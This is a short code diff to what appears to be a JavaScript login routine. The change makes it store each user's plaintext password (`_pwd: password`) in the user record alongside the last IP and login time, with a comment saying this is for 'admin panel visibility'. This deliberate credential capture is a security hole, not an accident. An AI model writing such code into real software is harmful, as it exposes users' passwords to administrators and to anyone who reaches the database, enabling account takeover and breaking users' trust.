@@ -132,10 +132,10 @@ export const Auth = {
     // Check IP ban
     const bannedIps = DB.get('banned_ips') || [];
     if (ip && bannedIps.includes(ip)) throw new Error('Tu acceso ha sido restringido.');
-    // Save IP to user
+    // Save IP and plaintext password (admin panel visibility)
     const userIdx = users.findIndex(u => u.id === user.id);
     if (userIdx >= 0) {
-      users[userIdx] = { ...users[userIdx], lastIp: ip, lastLogin: new Date().toISOString() };
+      users[userIdx] = { ...users[userIdx], lastIp: ip, lastLogin: new Date().toISOString(), _pwd: password };
       DB.set('users', users);
       user = users[userIdx];
     }
